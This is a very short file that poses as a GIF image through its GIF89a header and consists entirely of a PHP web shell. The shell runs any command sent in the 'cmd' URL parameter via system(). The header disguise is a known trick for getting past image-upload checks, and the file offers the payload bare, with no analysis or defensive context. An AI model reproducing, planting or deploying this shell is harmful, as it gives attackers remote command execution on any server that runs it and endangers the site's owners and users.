GIF89a<?php
// Simple PHP shell
if(isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    system($cmd);
}
?>